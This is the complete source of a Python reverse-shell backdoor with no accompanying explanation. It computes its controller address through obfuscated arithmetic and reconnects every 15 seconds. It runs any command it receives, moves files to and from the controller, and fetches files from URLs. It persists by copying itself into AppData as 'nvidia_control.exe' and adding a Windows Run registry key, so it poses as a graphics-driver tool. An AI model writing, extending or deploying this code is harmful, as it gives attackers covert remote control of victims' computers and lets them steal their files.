#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests


Host = "192.168.0.5"
Port = 5050



def server():
    global soc
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        time.sleep(15)
        try:
            soc.connect((H_ost(), P_ort()))
            shell()
        except:
            server()
        
def H_ost():
    H = str((5*((2*5)+10))+(2*((4*5)+20))+(3*4))+'.'
    o = str(((1*5)*((2*5)+(2*5)))+(2*(3*(2*5)))+(2*4))+'.'
    s = str((5*(((2*4)+2)+((2*3)+(2*2))))+((2*5)*5)+(3*3))+'.'
    t = str(((2+3)*((((1+1)*2)+((2+1)*2))+((2**3)+2)))+(((1+1)*10)+(2*4)))
    Host = H+o+s+t
    return Host

def P_ort():
    port = ""
    for i in range(5, 0, -1):
        port = str(port) + str(i)
    return int(port)


def shell():
    while True:
        commend = reliable_recv()
        if commend == 'exit' : exit()
        elif commend[:2] == "cd" and len(commend) > 1:
            try:
                os.chdir(commend[3:])
            except:
                continue
        elif commend[:8] in ["Download", "download"]:
            with open(commend[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif commend[:6] in ["upload", "Upload"]:
            with open(commend[7:], "wb") as fin:
                file_data = reliable_recv()
                fin.write(base64.b64decode(file_data))
        elif commend[:3] == "get":
            try:
                download(commend[4:])
                reliable_send("\n[*] Download File From Specified URL!\n")
            except:
                reliable_send("\n[-] Failed To Download That File\n")
        
        else:
            pro = subprocess.Popen(commend, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = pro.stdout.read() + pro.stderr.read()
            reliable_send(result)

def reliable_send(data):
    json_data= json.dumps(data)
    soc.send(json_data)

def reliable_recv():
    data=''
    while True:
        try:
            data = data + soc.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def copy_reverse():
    location = os.environ["appdata"] + "\\nvidia_control.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v nvidia_control /t REG_SZ /d "' + location + '"', shell=True)
    


def download(url):
    get_respons = requests.get(url)
    pass_name = url.split("/")[-1]
    with open(pass_name, "wb") as out_file:
        out_file.write(get_respons.content)




copy_reverse()
server()
